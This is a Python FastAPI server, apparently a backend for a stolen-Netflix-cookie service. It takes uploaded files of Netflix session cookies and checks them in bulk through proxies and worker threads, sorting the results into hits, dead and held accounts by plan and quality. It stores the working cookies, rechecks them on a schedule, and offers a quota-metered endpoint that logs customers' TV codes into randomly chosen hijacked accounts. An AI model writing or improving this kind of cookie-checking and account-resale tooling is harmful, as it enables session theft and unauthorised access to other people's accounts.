from fastapi import FastAPI, UploadFile, File, Form, BackgroundTasks, Request, Depends, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import APIKeyHeader
from typing import Optional
from apscheduler.schedulers.background import BackgroundScheduler
import pytz
import uvicorn
import threading
from queue import Queue
import uuid
import time

import core
import database

# Import verify_admin so we can reuse the Username/Password popup!
from admin import admin_router, verify_admin 

app = FastAPI(title="OOR Full System")

# --- 1. SECURITY: BROWSER CORS ---
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.include_router(admin_router)

PROXIES = core.load_proxies()
upload_tasks = {}

# --- 2. SECURITY: THE VAULT INTERCEPTOR WITH QUOTAS ---
api_key_header = APIKeyHeader(name="X-API-Key", auto_error=False)

def verify_security(api_key: str = Depends(api_key_header)):
    if not api_key:
        raise HTTPException(status_code=401, detail="Missing X-API-Key header")
        
    key_data = database.get_api_key(api_key)
    if not key_data:
        raise HTTPException(status_code=401, detail="Invalid API Key")

    key_data['api_key'] = api_key

    # --- QUOTA CHECK ---
    quota_limit = int(key_data.get("quota_limit", 0))
    quota_period = key_data.get("quota_period", "lifetime")
    
    if quota_limit > 0:
        current_usage = database.get_usage(api_key, quota_period)
        if current_usage >= quota_limit:
            raise HTTPException(status_code=429, detail=f"Quota Exceeded. Limit of {quota_limit} requests ({quota_period}) reached.")

    return key_data


# --- BACKGROUND AUTO-SCANNER ---
def revalidate_db_task():
    try:
        all_ids = database.r.smembers("all_hits")
        if not all_ids: return
    except: return
    
    q = Queue()
    for nid in all_ids: q.put(nid)
    
    stats = {"hits": 0, "free": 0, "holds": 0, "dead": 0, "errors": 0, "unknown": 0, "duplicates": 0, "qualities": {}, "plans": {}}
    print_lock = threading.Lock()
    guid_lock = threading.Lock()
    processed_guids = set()
    
    def db_cleanup_hook(data): pass 

    threads = []
    db_threads = min(20, max(5, len(all_ids) // 10))
    for _ in range(db_threads):
        t = threading.Thread(target=core.check_worker, args=(q, print_lock, stats, PROXIES, processed_guids, guid_lock, db_cleanup_hook))
        t.daemon = True
        t.start()
        threads.append(t)
    q.join()

ist_tz = pytz.timezone('Asia/Kolkata')
scheduler = BackgroundScheduler(timezone=ist_tz)
scheduler.add_job(revalidate_db_task, 'cron', hour='0,8,16')
scheduler.start()


# --- API ENDPOINTS ---
@app.post("/api/upload")
async def upload_file(
    background_tasks: BackgroundTasks,
    file: UploadFile = File(...),
    req_plan: str = Form(""),
    req_quality: str = Form(""),
    req_language: str = Form(""),
    key_data: dict = Depends(verify_security) 
):
    if key_data.get("role") != "owner":
        return JSONResponse(status_code=403, content={"error": "Only the Owner can upload to the database."})

    contents = await file.read()
    filename = getattr(file, "filename", "") or "" 
    extracted_ids = core.extract_ids_from_bytes(contents, filename)
    
    if not extracted_ids: 
        return JSONResponse(content={"error": "No NetflixIds found"}, status_code=400)

    id_list = list(extracted_ids)
    task_id = str(uuid.uuid4())
    upload_tasks[task_id] = {"status": "running", "total": len(id_list), "checked": 0, "summary": None, "start_time": time.time(), "eta": 0}

    def run_nfx_and_store():
        q = Queue()
        for nid in id_list: q.put(nid)
        stats = {"hits": 0, "free": 0, "holds": 0, "dead": 0, "errors": 0, "unknown": 0, "duplicates": 0, "qualities": {}, "plans": {}}
        print_lock = threading.Lock()
        guid_lock = threading.Lock()
        processed_guids = set() 
        
        def db_save_hook(data):
            if req_plan and req_plan.lower() != data["plan"].lower(): return
            if req_quality and req_quality.lower() != data["quality"].lower(): return
            if req_language and req_language.lower() != data["language"].lower(): return
            database.save_cookie_db(data)

        threads = []
        num_cookies = len(id_list)
        if num_cookies <= 20: num_threads = min(3, num_cookies)
        elif num_cookies <= 100: num_threads = 10
        elif num_cookies <= 500: num_threads = 25
        else: num_threads = 50
            
        for _ in range(num_threads):
            t = threading.Thread(target=core.check_worker, args=(q, print_lock, stats, PROXIES, processed_guids, guid_lock, db_save_hook))
            t.daemon = True
            t.start()
            threads.append(t)
            
        while any(t.is_alive() for t in threads):
            upload_tasks[task_id]["checked"] = num_cookies - q.qsize()
            time.sleep(0.5)

        q.join()
        local_ip, proxy_status = core.get_public_ip(PROXIES)
        upload_tasks[task_id]["checked"] = num_cookies
        upload_tasks[task_id]["status"] = "completed"
        upload_tasks[task_id]["eta"] = 0
        upload_tasks[task_id]["summary"] = {"Checked": num_cookies, "Base VPN/IP": local_ip, "Proxy Status": proxy_status, "Breakdown by Quality (Hits Only)": stats["qualities"], "Breakdown by Plan (Hits Only)": stats["plans"]}

    background_tasks.add_task(run_nfx_and_store)
    return {"task_id": task_id, "message": "Engine Started."}

@app.get("/api/status/{task_id}")
def get_task_status(task_id: str, key_data: dict = Depends(verify_security)):
    if key_data.get("role") != "owner":
        return JSONResponse(status_code=403, content={"error": "Unauthorized"})

    if task_id not in upload_tasks:
        return JSONResponse(content={"error": "Task not found"}, status_code=404)
        
    task_data = upload_tasks[task_id]
    if task_data["status"] == "running" and task_data["checked"] > 0:
        elapsed = time.time() - task_data["start_time"]
        rate = elapsed / task_data["checked"] 
        remaining = task_data["total"] - task_data["checked"]
        task_data["eta"] = max(0, int(rate * remaining))
        
    return task_data

# --- FIX: NOW USES HTTP BASIC AUTH FOR DIRECT BROWSER ACCESS ---
@app.get("/api/cookies")
@app.get("/api/cookie")
def get_all_cookies(
    plan: Optional[str] = None, 
    quality: Optional[str] = None, 
    language: Optional[str] = None, 
    user: str = Depends(verify_admin)  # Protects with Admin Username/Password
):
    results = database.get_filtered_cookies(plan, quality, language)
    return {"count": len(results), "data": results}


@app.post("/api/tv-login")
def tv_login(
    tv_code: str = Form(...),
    plan: Optional[str] = Form(""),
    quality: Optional[str] = Form(""),
    language: Optional[str] = Form(""),
    key_data: dict = Depends(verify_security) 
):
    import random
    available_cookies = database.get_filtered_cookies(plan, quality, language)
    
    if not available_cookies:
        return {"success": False, "message": "No active accounts currently match those exact specifications. Please alter your filters."}
        
    chosen_cookie = random.choice(available_cookies)
    target_id = chosen_cookie["netflix_id"]

    result = core.automate_tv_login(target_id, tv_code, PROXIES)
    
    success = result[0]
    msg = result[1]
    refreshed = result[2] if len(result) > 2 else target_id
    
    # Deduct quota ONLY on success
    if success:
        database.increment_quota(key_data['api_key'], key_data.get('quota_period', 'lifetime'))
    
    return {
        "success": success, 
        "message": msg,
        "refreshed_cookie": refreshed
    }

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
